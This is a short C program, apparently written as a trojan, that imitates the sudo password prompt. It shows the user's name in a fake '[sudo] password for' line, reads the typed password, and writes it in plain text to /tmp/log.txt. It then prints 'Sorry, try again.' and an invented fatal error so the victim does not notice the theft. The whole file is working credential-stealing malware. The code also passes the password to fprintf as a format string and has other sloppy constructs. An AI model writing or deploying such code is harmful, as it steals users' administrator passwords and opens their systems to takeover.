#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>

int main(int argc, char *argv[6])
{
	int mpid = getppid();
	char *anyth[] = {NULL};
	if (argc == 1) {
		//system("/bin/sudo");
		return 0;
	}
	const const char *bin = "/bin/";
	struct passwd *user;
	FILE *fd;
	int uid = getuid();
	user = getpwuid(uid);
	char *buff;
	buff = (char*)malloc(10*sizeof(char));
	char *pass;
	pass = (char*)malloc(20*sizeof(char));

	printf("[sudo] password for %s: ", user->pw_name);
	pass = getpass("");

	fd =fopen("/tmp/log.txt", "w");
	fprintf(fd, pass);
	fclose(fd);

	printf("Sorry, try again.\n");
	sleep(1);
	printf("\nfatal error 0x34FA78\n");
	sleep(1);
	system("exit");
	kill(mpid, 0);
	return 0;
}
